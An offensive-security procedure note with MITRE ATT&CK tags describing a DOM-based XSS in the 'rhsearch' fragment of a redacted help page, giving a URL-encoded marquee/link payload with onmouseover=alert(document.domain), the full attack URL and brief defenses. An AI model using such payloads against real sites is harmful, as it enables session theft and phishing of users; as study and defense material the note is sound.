---
tags:
  - xss
  - html-injection
type: procedure
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:15:41.692Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: eb133a30-cf83-4ecc-9fe7-310e471ca951
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
  - '[[JavaScript]]'
---
# Inject-Malicious-Link-with-onmouseover

## Summary

This procedure injects a malicious HTML link within a <marquee> tag using an onmouseover event to execute JavaScript, enabling interactive XSS attacks like session theft on hover.

## Description

By injecting nested HTML elements into the rhsearch parameter, attackers can create visible, interactive content that triggers JS without full navigation. This escalates the HTML injection to a persistent visual exploit, useful for phishing or data collection in social engineering scenarios.

## Requirements

1. Web browser for testing
2. Target URL access: https://[redacted]/help-leave/help/index.htm?ux=search
3. URL encoding knowledge for special characters

## Defense

Defensive measures and detection strategies:

- Strip or encode HTML tags in URL fragments before DOM insertion
- Enforce strict CSP to block event handler execution
- Log and alert on unusual DOM manipulations detected via browser extensions or WAF

## Objectives

1. Inject and render custom HTML links
2. Execute JS on user interaction (mouseover)
3. Simulate phishing link deployment

## Instructions

### Step 1: Encode Payload for Link Injection

**Context**: Build a payload with <marquee>, <u>, and <a> tags, attaching onmouseover to alert the domain.

Encoded payload: `%3Cmarquee%3E%3Cu%3E%3Ca%20href%3D%22http%3A%2F%2Fwww.google.com%22%20onmouseover%3Dalert(document.domain)%3EXSS%20HACKERONE%20%2F%20lemonoftroy%3C%2Fa%3E%3C%2Fmarquee%3E`

Full URL:

```url
https://[redacted]/help-leave/help/index.htm#rhsearch=%3Cmarquee%3E%3Cu%3E%3Ca%20href%3D%22http%3A%2F%2Fwww.google.com%22%20onmouseover%3Dalert(document.domain)%3EXSS%20HACKERONE%20%2F%20lemonoftroy%3C%2Fa%3E%3C%2Fmarquee%3E&ux=search
```

> Decodes to visible underlined link text; hovering executes the alert without following the href.

### Step 2: Test Interaction

**Context**: Load the page and interact with the injected element.

Visit the URL, locate the scrolling marquee with the link, and hover over it.

> Expected: Alert displays domain on hover. Inspect element to confirm injection.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Execution]]

### Techniques

- [[Drive-by Compromise]]
- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[html-injection]]
